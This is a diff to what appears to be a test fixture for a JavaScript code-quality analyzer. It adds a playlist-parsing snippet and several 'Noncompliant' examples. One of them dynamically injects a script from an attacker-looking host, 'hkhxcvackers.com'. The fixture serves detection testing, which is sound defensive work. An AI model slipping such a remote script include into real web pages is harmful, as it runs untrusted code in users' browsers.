@@ -1,3 +1,26 @@
+var tempPlaylist = "$MYINF_29$";
+myPlaylist = (tempPlaylist.substring(0,tempPlaylist.length-1)).split(';');
+for (i = 0; i < myPlaylist.length; i=i+8) { 
+if (myPlaylist[i]==cid && myPlaylist[i+6]!='')
+ if (cid==4 || cid==19)
+ {
+ cid_arr.push(myPlaylist[i+2]);
+ }
+else
+{
+cid_items.push({
+ mp3:myPlaylist[i+1],
+ title:myPlaylist[i+2],
+ artist:myPlaylist[i+3],
+ rating:myPlaylist[i+4],
+ buy:myPlaylist[i+5],
+ duration:myPlaylist[i+6],
+ cover:cover_path
+ });
+}
+}
+ }
+
 var data = {
   "key": "value",
   "1": "value",
@@ -9,6 +32,14 @@ var data = {
   "\x6bey": "value", // Noncompliant - duplicate of "key"
   1: "value" // Noncompliant - duplicate of "1"
 }
+
+function include(url) {
+  var s = document.createElement("script");
+  s.setAttribute("type", "text/javascript");
+  s.setAttribute("src", url);
+  document.body.appendChild(s);
+}
+include("http://hkhxcvackers.com/steawerwetl.js")  // Noncompliant
 
 var myWindow = document.getElementById('myIFrame').contentWindow;
 myWindow.postMessage(message, "*"); // Noncompliant; how do you know what you loaded in 'myIFrame' is still there?
